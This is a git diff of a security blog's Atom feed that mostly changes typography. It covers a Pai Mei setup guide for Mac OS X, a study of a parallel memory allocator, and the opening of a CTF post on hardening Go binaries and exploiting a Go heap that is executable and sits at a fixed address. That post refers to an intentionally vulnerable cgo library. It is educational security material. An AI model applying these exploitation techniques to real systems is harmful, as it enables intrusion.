-&lt;p&gt;(I sincerely hope there is a better way, but I couldn't find one). Note: as of yet, I haven't found a way to get &lt;tt&gt;wxPython&lt;/tt&gt; to work in 32 bit python. I'll update the post when I figure that out.&lt;/li&gt;
+&lt;p&gt;(I sincerely hope there is a better way, but I couldn&amp;#8217;t find one). Note: as of yet, I haven&amp;#8217;t found a way to get &lt;tt&gt;wxPython&lt;/tt&gt; to work in 32 bit python. I&amp;#8217;ll update the post when I figure that&amp;nbsp;out.&lt;/li&gt;
 &lt;/ul&gt;&lt;/p&gt;
-&lt;h3&gt;Installing Pai Mei&lt;/h3&gt;
+&lt;h3&gt;Installing Pai&amp;nbsp;Mei&lt;/h3&gt;
 
-&lt;p&gt;Pai Mei uses the &lt;a href="https://github.com/OpenRCE/pydbg"&gt;pydbg&lt;/a&gt; library (I believe it is linked incorrectly in the repository as a git submodule). I strongly encourage you &lt;a href="https://github.com/gdbinit/pydbg64"&gt;this&lt;/a&gt; version of pydbg instead, which is a port to 64 Mac OSX by Charlie Miller and fG. Cloning the repository and installing via instructions in the &lt;tt&gt;MacOSX/README&lt;/tt&gt; worked fine for me. Warning: you can only use this library to debug a 32 bit process from 32 bit python and a 64 bit process from 64 bit python: to use 32 bit python, do: &lt;/p&gt;
+&lt;p&gt;Pai Mei uses the &lt;a href="https://github.com/OpenRCE/pydbg"&gt;pydbg&lt;/a&gt; library (I believe it is linked incorrectly in the repository as a git submodule). I strongly encourage you &lt;a href="https://github.com/gdbinit/pydbg64"&gt;this&lt;/a&gt; version of pydbg instead, which is a port to 64 Mac &lt;span class="caps"&gt;OSX&lt;/span&gt; by Charlie Miller and fG. Cloning the repository and installing via instructions in the &lt;tt&gt;MacOSX/&lt;span class="caps"&gt;README&lt;/span&gt;&lt;/tt&gt; worked fine for me. Warning: you can only use this library to debug a 32 bit process from 32 bit python and a 64 bit process from 64 bit python: to use 32 bit python,&amp;nbsp;do: &lt;/p&gt;
 &lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="nv"&gt;VERSIONER_PYTHON_PREFER_32_BIT&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;yes /usr/bin/python
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;After installing &lt;tt&gt;pydbg64&lt;/tt&gt;, I now had a directory tree that looked like:&lt;/p&gt;
+&lt;p&gt;After installing &lt;tt&gt;pydbg64&lt;/tt&gt;, I now had a directory tree that looked&amp;nbsp;like:&lt;/p&gt;
 &lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="go"&gt;pydbg64/&lt;/span&gt;
 &lt;span class="go"&gt;├── pydbg&lt;/span&gt;
 &lt;span class="go"&gt;└── ...&lt;/span&gt;
@@ -281,7 +282,7 @@ hit that instruction during the trace (result below trimmed for brevity).&lt;/p&
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;I deleted the &lt;tt&gt;paimei/pydbg&lt;/tt&gt; directory and added a symlink to the &lt;tt&gt;pydbg64/pydbg&lt;/tt&gt; directory, then  copied the fat &lt;tt&gt;libmacdll.dylib&lt;/tt&gt; from &lt;tt&gt;pydbg64/pydbg/libmacdll.dylib&lt;/tt&gt; to &lt;tt&gt;paimei/utils&lt;/tt&gt;. This left a directory that looked like this:&lt;/p&gt;
+&lt;p&gt;I deleted the &lt;tt&gt;paimei/pydbg&lt;/tt&gt; directory and added a symlink to the &lt;tt&gt;pydbg64/pydbg&lt;/tt&gt; directory, then  copied the fat &lt;tt&gt;libmacdll.dylib&lt;/tt&gt; from &lt;tt&gt;pydbg64/pydbg/libmacdll.dylib&lt;/tt&gt; to &lt;tt&gt;paimei/utils&lt;/tt&gt;. This left a directory that looked like&amp;nbsp;this:&lt;/p&gt;
 &lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="go"&gt;pydbg64/&lt;/span&gt;
 &lt;span class="go"&gt;├── pydbg&lt;/span&gt;
 &lt;span class="go"&gt;└── ...&lt;/span&gt;
@@ -296,21 +297,21 @@ hit that instruction during the trace (result below trimmed for brevity).&lt;/p&
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;We now need to install all the Pai Mei packages (&lt;tt&gt;utils&lt;/tt&gt;, &lt;tt&gt;pida&lt;/tt&gt;, &lt;tt&gt;pgraph&lt;/tt&gt;) into the correct place so python can find them.&lt;/p&gt;
+&lt;p&gt;We now need to install all the Pai Mei packages (&lt;tt&gt;utils&lt;/tt&gt;, &lt;tt&gt;pida&lt;/tt&gt;, &lt;tt&gt;pgraph&lt;/tt&gt;) into the correct place so python can find&amp;nbsp;them.&lt;/p&gt;
 &lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;#&lt;/span&gt; ln -s /usr/local/paimei/pida /Library/Python/2.7/site-packages/pida
 &lt;span class="gp"&gt;#&lt;/span&gt; ln -s /usr/local/paimei/pgraph /Library/Python/2.7/site-packages/pgraph
 &lt;span class="gp"&gt;#&lt;/span&gt; ln -s /usr/local/paimei/utils /Library/Python/2.7/site-packages/utils
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;h3&gt;Running Pai Mei&lt;/h3&gt;
+&lt;h3&gt;Running Pai&amp;nbsp;Mei&lt;/h3&gt;
 
-&lt;p&gt;Before we can run Pai Mei, we must initialize the database: &lt;/p&gt;
+&lt;p&gt;Before we can run Pai Mei, we must initialize the&amp;nbsp;database: &lt;/p&gt;
 &lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; python /usr/local/paimei/__setup_mysql.py localhost root rootpassword
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;Next, we have to patch a few bugs in Pai Mei (it calls a deprecated function and the MySql modal tries to helpfully destroy itself after successfully connecting to the database, but unfortunately does so before Python is completely done with it).&lt;/p&gt;
+&lt;p&gt;Next, we have to patch a few bugs in Pai Mei (it calls a deprecated function and the MySql modal tries to helpfully destroy itself after successfully connecting to the database, but unfortunately does so before Python is completely done with&amp;nbsp;it).&lt;/p&gt;
 &lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gh"&gt;diff --git a/console/PAIMEIconsole.pyw b/console/PAIMEIconsole.pyw&lt;/span&gt;
 &lt;span class="gh"&gt;index a45cbbf..0fea2ae 100644&lt;/span&gt;
 &lt;span class="gd"&gt;--- a/console/PAIMEIconsole.pyw&lt;/span&gt;
@@ -355,8 +356,8 @@ hit that instruction during the trace (result below trimmed for brevity).&lt;/p&
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;Now, we must make sure that python has the appropriate permisisons to monitor other processes before we can use Pai Mei. Unfortunately, this is not so easy anymore - since Snow Leopard, processes must be code signed in order to escalate privileges (a good writeup &lt;a href="http://os-tres.net/blog/2010/02/17/mac-os-x-and-task-for-pid-mach-call/"&gt;here&lt;/a&gt;). We could possibly patch pydbg to ask for permissions and sign it to work or disabling some system wide setting, but for now we will just run Pai Mei as root.&lt;/p&gt;
-&lt;p&gt;A last disclaimer: the process stalker uses the name of the executable to find which pida module to load. Unfortunately, it truncates the process name, striping the directory, but insists that the name matches the full path to the pida module. I managed to hard code it to just always use the first pida module, but I don't know what the correct solution is. &lt;/p&gt;
+&lt;p&gt;Now, we must make sure that python has the appropriate permisisons to monitor other processes before we can use Pai Mei. Unfortunately, this is not so easy anymore - since Snow Leopard, processes must be code signed in order to escalate privileges (a good writeup &lt;a href="http://os-tres.net/blog/2010/02/17/mac-os-x-and-task-for-pid-mach-call/"&gt;here&lt;/a&gt;). We could possibly patch pydbg to ask for permissions and sign it to work or disabling some system wide setting, but for now we will just run Pai Mei as&amp;nbsp;root.&lt;/p&gt;
+&lt;p&gt;A last disclaimer: the process stalker uses the name of the executable to find which pida module to load. Unfortunately, it truncates the process name, striping the directory, but insists that the name matches the full path to the pida module. I managed to hard code it to just always use the first pida module, but I don&amp;#8217;t know what the correct solution&amp;nbsp;is. &lt;/p&gt;
 &lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gh"&gt;diff --git a/console/modules/_PAIMEIpstalker/ProcessListCtrl.py b/console/modules/_PAIMEIpstalker/ProcessListCtrl.py&lt;/span&gt;
 &lt;span class="gh"&gt;index b37bd01..63880e3 100644&lt;/span&gt;
 &lt;span class="gd"&gt;--- a/console/modules/_PAIMEIpstalker/ProcessListCtrl.py&lt;/span&gt;
@@ -373,13 +374,13 @@ hit that instruction during the trace (result below trimmed for brevity).&lt;/p&
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;After all this, I finally got Pai Mei (barely) working but I suspect I would have had an easier time and more fun just writing it myself ;-)&lt;/p&gt;</summary></entry><entry><title>Analysis of a Parallel Memory Allocator</title><link href="http://codearcana.com/analysis-of-a-parallel-memory-allocator.html" rel="alternate"></link><updated>2012-05-11T00:00:00+02:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2012-05-11:analysis-of-a-parallel-memory-allocator.html</id><summary type="html">&lt;h1&gt;Background&lt;/h1&gt;
+&lt;p&gt;After all this, I finally got Pai Mei (barely) working but I suspect I would have had an easier time and more fun just writing it myself&amp;nbsp;;-)&lt;/p&gt;</summary><category term="mac osx"></category><category term="reverse engineering"></category></entry><entry><title>Analysis of a Parallel Memory Allocator</title><link href="http://codearcana.com/analysis-of-a-parallel-memory-allocator.html" rel="alternate"></link><updated>2012-05-11T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2012-05-11:analysis-of-a-parallel-memory-allocator.html</id><summary type="html">&lt;h1&gt;Background&lt;/h1&gt;
 &lt;h2&gt;Problem&lt;/h2&gt;
 &lt;p&gt;Many modern programs frequently use dynamic memory allocation. However, modern
 programs increasingly are multithreaded and parallel to take advantage of
 increasingly parallel processors. Unfortunately, this trend conflicts with the
 fact that there is a single heap in most current programs. Consequently,
-research into parallel memory allocators is topical and important.&lt;/p&gt;
+research into parallel memory allocators is topical and&amp;nbsp;important.&lt;/p&gt;
 &lt;h2&gt;Solution?&lt;/h2&gt;
 &lt;p&gt;The simplest solution to ensuring correctness in a multithread memory allocator
 is to use a global lock around the heap. Unfortunately, this has
@@ -390,16 +391,16 @@ some form of the following 3 solutions:
 &lt;li&gt;
 They partition the heap into logical arenas or chunks that handle large 
 portions of the heap. This reduces contention on the global heap and 
-heap data structures.
+heap data&amp;nbsp;structures.
 &lt;/li&gt;
 &lt;li&gt;
-They use fine grained locking on individual slabs or slab classes.
+They use fine grained locking on individual slabs or slab&amp;nbsp;classes.
 &lt;/li&gt;
 &lt;li&gt;
-They use thread local caches to provide a fast path that requires no locks.
+They use thread local caches to provide a fast path that requires no&amp;nbsp;locks.
 &lt;/li&gt;
 &lt;/ul&gt;&lt;/p&gt;
-&lt;h2&gt;Modern memory allocators&lt;/h2&gt;
+&lt;h2&gt;Modern memory&amp;nbsp;allocators&lt;/h2&gt;
 &lt;p&gt;&lt;p&gt;As I understand, the most popular modern parallel mallocs are 
 &lt;a href="https://www.facebook.com/notes/facebook-engineering/scalable-memory-allocation-using-jemalloc/480222803919"&gt;&lt;tt&gt;jemalloc&lt;/tt&gt;&lt;/a&gt;, 
 &lt;a href="http://goog-perftools.sourceforge.net/doc/tcmalloc.html"&gt;&lt;tt&gt;tcmalloc&lt;/tt&gt;&lt;/a&gt;, 
@@ -410,23 +411,23 @@ and &lt;a href="http://www.cs.umass.edu/~emery/pubs/berger-asplos2000.pdf"&gt;&l
 Oracle did some 
 &lt;a href="http://developers.sun.com/solaris/articles/multiproc/multiproc.html"&gt;investigation&lt;/a&gt; 
 and I have taken a look at the internals of jemalloc, tcmalloc, concur, and hoard. 
-As I understand:&lt;/p&gt;
-&lt;ul&gt;&lt;li&gt;&lt;tt&gt;tcmalloc&lt;/tt&gt; uses a global slab allocator with thread local caches to avoid contention&lt;/li&gt;
-    &lt;li&gt;&lt;tt&gt;hoard&lt;/tt&gt; uses different arenas and assigns superblocks to threads to avoid contention&lt;/li&gt;
+As I&amp;nbsp;understand:&lt;/p&gt;
+&lt;ul&gt;&lt;li&gt;&lt;tt&gt;tcmalloc&lt;/tt&gt; uses a global slab allocator with thread local caches to avoid&amp;nbsp;contention&lt;/li&gt;
+    &lt;li&gt;&lt;tt&gt;hoard&lt;/tt&gt; uses different arenas and assigns superblocks to threads to avoid&amp;nbsp;contention&lt;/li&gt;
     &lt;li&gt;&lt;tt&gt;jemalloc&lt;/tt&gt; uses different arenas and thread local caches to avoid contention
-and uses red black trees and an optimized slab allocator to avoid fragmentation&lt;/li&gt;
-&lt;li&gt;&lt;tt&gt;concur&lt;/tt&gt; uses different arenas and fine grained locking on size classes to avoid contention&lt;/li&gt;
+and uses red black trees and an optimized slab allocator to avoid&amp;nbsp;fragmentation&lt;/li&gt;
+&lt;li&gt;&lt;tt&gt;concur&lt;/tt&gt; uses different arenas and fine grained locking on size classes to avoid&amp;nbsp;contention&lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;p&gt;&lt;/p&gt;
 &lt;p&gt;
 One interesting characteristic of many of these memory allocators is that they
-all tend to allocate memory from the system in chunks of about 1 to 4MB.
-Consequently, they tend to have an overhead of up to 2 to 4MB per arena. Most
-of them justify this overhead by pointing out that 2MB of overhead is minimal
-when the total application footprint can exceed 1GB (in an application such as
-firefox) and it is acceptable for an application to use 2MB of heap when
-modern computers routinely have several GB of RAM.
+all tend to allocate memory from the system in chunks of about 1 to &lt;span class="caps"&gt;4MB&lt;/span&gt;.
+Consequently, they tend to have an overhead of up to 2 to &lt;span class="caps"&gt;4MB&lt;/span&gt; per arena. Most
+of them justify this overhead by pointing out that &lt;span class="caps"&gt;2MB&lt;/span&gt; of overhead is minimal
+when the total application footprint can exceed &lt;span class="caps"&gt;1GB&lt;/span&gt; (in an application such as
+firefox) and it is acceptable for an application to use &lt;span class="caps"&gt;2MB&lt;/span&gt; of heap when
+modern computers routinely have several &lt;span class="caps"&gt;GB&lt;/span&gt; of&amp;nbsp;&lt;span class="caps"&gt;RAM&lt;/span&gt;.
 &lt;/p&gt;&lt;/p&gt;
 &lt;p&gt;
 Another interesting characteristic of these memory allocators is they almost
@@ -434,11 +435,11 @@ never coallesce individual blocks (some do coallesce individual blocks).
 Instead, they use slab allocators and assume
 allocation requests tend be of very similar sizes. In general, this follows
 the general pattern of tolerating a moderate amount of memory overhead to
-increase performance.
+increase&amp;nbsp;performance.
 &lt;/p&gt;
 
 &lt;h1&gt;Approach&lt;/h1&gt;
-&lt;h2&gt;A simple modern memory allocator&lt;/h2&gt;
+&lt;h2&gt;A simple modern memory&amp;nbsp;allocator&lt;/h2&gt;
 &lt;p&gt;&lt;p&gt;
 In order to investigate and analyze the performance of a modern memory
 allocator, I wrote a simplified memory allocator, &lt;tt&gt;ar_malloc&lt;/tt&gt;, that 
@@ -447,9 +448,9 @@ heavily on &lt;tt&gt;jemalloc&lt;/tt&gt; but makes some simplifications. In orde
 the work manageable, &lt;tt&gt;ar_malloc&lt;/tt&gt; makes the assumption that allocation 
 requests are smaller than 1024 bytes. In addition, it uses slabs of a fixed 
 size and never frees memory to the system (&lt;tt&gt;jemalloc&lt;/tt&gt; uses variable sized
-slabs to reduce memory overhead).
+slabs to reduce memory&amp;nbsp;overhead).
 &lt;/p&gt;&lt;/p&gt;
-&lt;h2&gt;Testing a memory allocator ##&lt;/h2&gt;
+&lt;h2&gt;Testing a memory allocator&amp;nbsp;##&lt;/h2&gt;
 &lt;p&gt;&lt;p&gt;
 In order to test &lt;tt&gt;ar_malloc&lt;/tt&gt;, I constructed a test framework (based off a
 test in the &lt;tt&gt;tcmalloc&lt;/tt&gt; codebase) that spawns 
@@ -457,13 +458,13 @@ several threads that each randomly decide to allocate a random sized block or
 free a random block. This does not simulate the effect of actually using the blocks
 and does not simulate a realistic workload, but it is still a useful
 basis for investigation. I ran this test on a 16 core shared memory system and used
-new initialization of malloc for each run to reduce the variance in run time.
+new initialization of malloc for each run to reduce the variance in run&amp;nbsp;time.
 &lt;/p&gt;&lt;/p&gt;
 &lt;h1&gt;Results&lt;/h1&gt;
-&lt;h2&gt;Comparision of &lt;tt&gt;ar_malloc&lt;/tt&gt; to other solutions&lt;/h2&gt;
+&lt;h2&gt;Comparision of &lt;tt&gt;ar_malloc&lt;/tt&gt; to other&amp;nbsp;solutions&lt;/h2&gt;
 &lt;p&gt;&lt;p&gt;
 We compared the performance of &lt;tt&gt;ar_malloc&lt;/tt&gt;, &lt;tt&gt;ar_malloc&lt;/tt&gt; with a global lock, 
-and the libc malloc on the test described in the previous section.
+and the libc malloc on the test described in the previous&amp;nbsp;section.
 &lt;/p&gt;
 &lt;figure&gt;
 &lt;img alt="Run time vs Number of threads" src="https://docs.google.com/spreadsheet/oimg?key=0AjzaNgu-PE5_dDJJUnRCaXZueks1UTlQVXBxYlFsSXc&amp;amp;oid=4&amp;amp;zx=1aneio5en2km" /&gt;
@@ -485,18 +486,18 @@ and the libc malloc on the test described in the previous section.
     &lt;/figcaption&gt;
 &lt;/figure&gt;
 
-&lt;h2&gt;Comparison of different configuration&lt;/h2&gt;
+&lt;h2&gt;Comparison of different&amp;nbsp;configuration&lt;/h2&gt;
 &lt;p&gt;&lt;p&gt;
 I examined several different configurations of &lt;tt&gt;ar_malloc&lt;/tt&gt;, specifically 
 focusing on the number of arenas. We attempted to figure out the effect of and 
-analyze the behavior of using different number of arenas.
+analyze the behavior of using different number of&amp;nbsp;arenas.
 &lt;/p&gt;&lt;/p&gt;
 &lt;figure&gt;
     &lt;img src="https://docs.google.com/spreadsheet/oimg?key=0AjzaNgu-PE5_dDJJUnRCaXZueks1UTlQVXBxYlFsSXc&amp;oid=11&amp;zx=fwaahh94nhlg" /&gt;
 &lt;figcaption&gt;This is a chart of run time vs number of threads for different configurations of &lt;tt&gt;ar_malloc&lt;/tt&gt;.
-    As you can see, there appear to be two curves. We will call the lower one the &amp;quot;no contention&amp;quot; curve and the
-    upper one the &amp;quot;contention&amp;quot; curve. You can see that the performance of a memory allocator moves from the &amp;quot;no contention&amp;quot;
-    curve to the &amp;quot;contention&amp;quot; curve when the number of threads exceeds the number of arenas.
+    As you can see, there appear to be two curves. We will call the lower one the &amp;#8220;no contention&amp;#8221; curve and the
+    upper one the &amp;#8220;contention&amp;#8221; curve. You can see that the performance of a memory allocator moves from the &amp;#8220;no contention&amp;#8221;
+    curve to the &amp;#8220;contention&amp;#8221; curve when the number of threads exceeds the number of arenas.
     &lt;/figcaption&gt;
 &lt;/figure&gt;
 
@@ -504,8 +505,8 @@ analyze the behavior of using different number of arenas.
     &lt;img src="https://docs.google.com/spreadsheet/oimg?key=0AjzaNgu-PE5_dDJJUnRCaXZueks1UTlQVXBxYlFsSXc&amp;oid=13&amp;zx=fhdbihufrx4u" /&gt;
     &lt;figcaption&gt;
     This is a chart of speedup vs number of threads for different configurations of &lt;tt&gt;ar_malloc&lt;/tt&gt;. As you before, there are 
-    two curves: the &amp;quot;no contention&amp;quot; line and the &amp;quot;contention&amp;quot; line. Again, the speedup of a memory allocator
-    moves from the &amp;quot;no contention&amp;quot; line to the &amp;quot;contention&amp;quot; line when the number of threads exceeds the 
+    two curves: the &amp;#8220;no contention&amp;#8221; line and the &amp;#8220;contention&amp;#8221; line. Again, the speedup of a memory allocator
+    moves from the &amp;#8220;no contention&amp;#8221; line to the &amp;#8220;contention&amp;#8221; line when the number of threads exceeds the 
     number of arenas. It is important to note that the speedup is still mostly linear even when the number of arenas is far less
     than number of threads.
     &lt;/figcaption&gt;
@@ -517,76 +518,75 @@ write a modern parallel memory allocator that performs quite favorably
 on random workloads. &lt;tt&gt;ar_malloc&lt;/tt&gt; makes many simplifying assumptions,
 but is just over 2000 lines of code, outperforms libc malloc by a factor
 of 3, and demonstrates linear speedup that seems to scale very well with
-the number of threads.&lt;/p&gt;
-&lt;h1&gt;Further Investigation&lt;/h1&gt;
+the number of&amp;nbsp;threads.&lt;/p&gt;
+&lt;h1&gt;Further&amp;nbsp;Investigation&lt;/h1&gt;
 &lt;p&gt;&lt;p&gt;
-There are several routes for further investigation in parallel memory
-allocators.&lt;/p&gt;
+There are several routes for further investigation in parallel memory&amp;nbsp;allocators.&lt;/p&gt;
 &lt;p&gt;The exisiting test framework allocates random sizes distributed
 uniformly in the range 8, 1024. This almost certainly does not simulate 
 realistic memory allocation patterns. An interesting further exploration could
 use &lt;tt&gt;ar_malloc&lt;/tt&gt; with real programs (either via static linking or LD_PRELOAD) 
-or to investigate the actual memory distribution of a general program. 
+or to investigate the actual memory distribution of a general&amp;nbsp;program. 
 &lt;/p&gt;
 &lt;p&gt;This investigation only examined the effect of different number of arenas.
 A further exploration could examine the effect of thread local caches and fine
 grained locking on the performance of &lt;tt&gt;ar_malloc&lt;/tt&gt;.
-&lt;/p&gt;&lt;/p&gt;</summary></entry><entry><title>Securing and Exploiting Go Binaries</title><link href="http://codearcana.com/securing-and-exploiting-go-binaries.html" rel="alternate"></link><updated>2012-05-06T00:00:00+02:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2012-05-06:securing-and-exploiting-go-binaries.html</id><summary type="html">&lt;h3&gt;Introduction&lt;/h3&gt;
+&lt;/p&gt;&lt;/p&gt;</summary><category term="malloc"></category></entry><entry><title>Securing and Exploiting Go Binaries</title><link href="http://codearcana.com/securing-and-exploiting-go-binaries.html" rel="alternate"></link><updated>2012-05-06T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2012-05-06:securing-and-exploiting-go-binaries.html</id><summary type="html">&lt;h3&gt;Introduction&lt;/h3&gt;
 
 &lt;p&gt;
-First, I have been working in Go for about a year now. As part of this years pCTF, I created a problem that involved exploiting a Go binary (binary and source &lt;a href="http://ppp.cylab.cmu.edu/wordpress/wp-content/uploads/2012/05/bunyan-wp.tar.gz"&gt;here&lt;/a&gt;). I consequently had to deal with securing the binary to prevent leaking unnecessary information and had some fun playing around with exploiting a Go binary.
+First, I have been working in Go for about a year now. As part of this years pCTF, I created a problem that involved exploiting a Go binary (binary and source &lt;a href="http://ppp.cylab.cmu.edu/wordpress/wp-content/uploads/2012/05/bunyan-wp.tar.gz"&gt;here&lt;/a&gt;). I consequently had to deal with securing the binary to prevent leaking unnecessary information and had some fun playing around with exploiting a Go&amp;nbsp;binary.
 &lt;/p&gt;
 
-&lt;h3&gt;Securing a Go Binary&lt;/h3&gt;
+&lt;h3&gt;Securing a Go&amp;nbsp;Binary&lt;/h3&gt;
 
 &lt;p&gt;
 Creating a secure, production-ready Go binary was more challenging than expected. By default: &lt;ul&gt;
-    &lt;li&gt;The Go build tools include the full path to the source on the build machine in the binary. &lt;/li&gt;
-    &lt;li&gt;Go binaries helpfully print the faulting address and instruction on segmentation faults.&lt;/li&gt;
-    &lt;li&gt;The heap in Go is loaded at a fixed address and is executable.&lt;/li&gt;
-    &lt;li&gt;Go binaries are linked with full debug information.&lt;/li&gt;
+    &lt;li&gt;The Go build tools include the full path to the source on the build machine in the&amp;nbsp;binary. &lt;/li&gt;
+    &lt;li&gt;Go binaries helpfully print the faulting address and instruction on segmentation&amp;nbsp;faults.&lt;/li&gt;
+    &lt;li&gt;The heap in Go is loaded at a fixed address and is&amp;nbsp;executable.&lt;/li&gt;
+    &lt;li&gt;Go binaries are linked with full debug&amp;nbsp;information.&lt;/li&gt;
 &lt;/ul&gt;
-I filed a &lt;a href="http://code.google.com/p/go/issues/detail?id=3467"&gt;issue&lt;/a&gt; suggesting the option for a compiler flag to create a hardended binary, but there has not been much interest in that yet.
+I filed a &lt;a href="http://code.google.com/p/go/issues/detail?id=3467"&gt;issue&lt;/a&gt; suggesting the option for a compiler flag to create a hardended binary, but there has not been much interest in that&amp;nbsp;yet.
 &lt;/p&gt;
 
 &lt;p&gt;
-Some of these problems can be mitigated with appropriate hacks. The path to the Go runtime can be changed by setting the environment variable &lt;tt&gt;GOROOT_FINAL&lt;/tt&gt; before running &lt;tt&gt;all.bash&lt;/tt&gt; (see &lt;a href="http://code.google.com/p/go/issues/detail?id=3467#c4"&gt;this comment&lt;/a&gt; on the issue I filed). For user code, it takes some more work: I had to deep copy all of my source into a &lt;tt&gt;/tmp/build&lt;/tt&gt; directory before compiling so that the only string was a &lt;tt&gt;"/tmp/build"&lt;/tt&gt; rather than the actual path.
+Some of these problems can be mitigated with appropriate hacks. The path to the Go runtime can be changed by setting the environment variable &lt;tt&gt;GOROOT_FINAL&lt;/tt&gt; before running &lt;tt&gt;all.bash&lt;/tt&gt; (see &lt;a href="http://code.google.com/p/go/issues/detail?id=3467#c4"&gt;this comment&lt;/a&gt; on the issue I filed). For user code, it takes some more work: I had to deep copy all of my source into a &lt;tt&gt;/tmp/build&lt;/tt&gt; directory before compiling so that the only string was a &lt;tt&gt;&amp;#8220;/tmp/build&amp;#8221;&lt;/tt&gt; rather than the actual&amp;nbsp;path.
 &lt;/p&gt;
 
 &lt;p&gt;
-Some debug information can be stripped by passing &lt;tt&gt;-s&lt;/tt&gt; as a command line to the linker (for example, &lt;tt&gt;go build -ldflags "-s" prog.go&lt;/tt&gt;). Note that this does not remove file paths, etc from the binary. It is pretty easy to patch the Go runtime to avoid printing the faulting address and instruction, but that should probably take the form of a real change rather than a quick and dirty patch. Unfortunately, the heap to be seems executable and loaded into fixed location by design (so that closures are easier and that heap addresses do not overlap with valid unicode strings, making the garbage collector easier), so it is not clear that that will be fixed for anytime soon.
+Some debug information can be stripped by passing &lt;tt&gt;-s&lt;/tt&gt; as a command line to the linker (for example, &lt;tt&gt;go build -ldflags &amp;#8220;-s&amp;#8221; prog.go&lt;/tt&gt;). Note that this does not remove file paths, etc from the binary. It is pretty easy to patch the Go runtime to avoid printing the faulting address and instruction, but that should probably take the form of a real change rather than a quick and dirty patch. Unfortunately, the heap to be seems executable and loaded into fixed location by design (so that closures are easier and that heap addresses do not overlap with valid unicode strings, making the garbage collector easier), so it is not clear that that will be fixed for anytime&amp;nbsp;soon.
 &lt;/p&gt;
 
-&lt;h3&gt;Exploiting a Go program&lt;/h3&gt;
+&lt;h3&gt;Exploiting a Go&amp;nbsp;program&lt;/h3&gt;
 
 &lt;h4&gt;Disclaimer&lt;/h4&gt;
 
 &lt;p&gt;
-First things first - I did &lt;em&gt;not&lt;/em&gt; find an exploit in the Go runtime that gave code execution. Instead, I linked the Go binary to a cgo library that had an intentional vulnerability. I had to do some work to make the cgo library exploitable. I made an explicitly vulnerabile C program and specified flags &lt;tt&gt;-fno-stack-protector -U_FORTIFY_SOURCE&lt;/tt&gt; to discard modern protections. Lastly, the behavior I performed in cgo (printing a string to stdout) could have trivially been perfomed in pure Go.
+First things first - I did &lt;em&gt;not&lt;/em&gt; find an exploit in the Go runtime that gave code execution. Instead, I linked the Go binary to a cgo library that had an intentional vulnerability. I had to do some work to make the cgo library exploitable. I made an explicitly vulnerabile C program and specified flags &lt;tt&gt;-fno-stack-protector -U_FORTIFY_SOURCE&lt;/tt&gt; to discard modern protections. Lastly, the behavior I performed in cgo (printing a string to stdout) could have trivially been perfomed in pure&amp;nbsp;Go.
 &lt;/p&gt;
 
 &lt;p&gt;
-However, I personally feel like Go packages use the unsafe package or are linked against full C libraries commonly enough (consider banthars &lt;a href="https://github.com/banthar/gl"&gt;package&lt;/a&gt; with Go bindings for OpenGl or a &lt;a href="http://go-lang.cat-v.org/library-bindings"&gt;variety&lt;/a&gt; of other packages) that it is irresponsible for the Go runtime to be poorly secured out of the claim that there are no vulnerabilies in Go. Furthermore, the Go runtime should be better secured to avoid the damage from any as of yet undiscovered vulnerabilities in the Go runtime.
+However, I personally feel like Go packages use the unsafe package or are linked against full C libraries commonly enough (consider banthars &lt;a href="https://github.com/banthar/gl"&gt;package&lt;/a&gt; with Go bindings for OpenGl or a &lt;a href="http://go-lang.cat-v.org/library-bindings"&gt;variety&lt;/a&gt; of other packages) that it is irresponsible for the Go runtime to be poorly secured out of the claim that there are no vulnerabilies in Go. Furthermore, the Go runtime should be better secured to avoid the damage from any as of yet undiscovered vulnerabilities in the Go&amp;nbsp;runtime.
 &lt;/p&gt;
 
 &lt;p&gt;
-Going forward, I will assume that there is a vulnerability (introduced possibly by a vulnerable C library) and will focus on one interesting way to exploit it by using the Go runtime. I will specifically focus on the &lt;a href="webapp"&gt;&lt;tt&gt;webapp&lt;/tt&gt;&lt;/a&gt; problem used in pCTF.
+Going forward, I will assume that there is a vulnerability (introduced possibly by a vulnerable C library) and will focus on one interesting way to exploit it by using the Go runtime. I will specifically focus on the &lt;a href="webapp"&gt;&lt;tt&gt;webapp&lt;/tt&gt;&lt;/a&gt; problem used in&amp;nbsp;pCTF.
 &lt;/p&gt;
 
-&lt;h4&gt;The actual exploit&lt;/h4&gt;
+&lt;h4&gt;The actual&amp;nbsp;exploit&lt;/h4&gt;
 
 &lt;p&gt;
 The Go runtime has some really interesting properties that make it fun to exploit:
 &lt;ul&gt;
-    &lt;li&gt;The heap is executable.&lt;/li&gt;
-    &lt;li&gt;The heap is deterministic and in a fixed location every run&lt;/li&gt;
-    &lt;li&gt;Immutable strings tend to end up on the heap&lt;/li&gt;
+    &lt;li&gt;The heap is&amp;nbsp;executable.&lt;/li&gt;
+    &lt;li&gt;The heap is deterministic and in a fixed location every&amp;nbsp;run&lt;/li&gt;
+    &lt;li&gt;Immutable strings tend to end up on the&amp;nbsp;heap&lt;/li&gt;
 &lt;/ul&gt;
-We will construct an exploit that takes advantage of all of these properties. First, we get get a vulnerability that gives us a crash.
+We will construct an exploit that takes advantage of all of these properties. First, we get get a vulnerability that gives us a&amp;nbsp;crash.
 &lt;/p&gt;
 
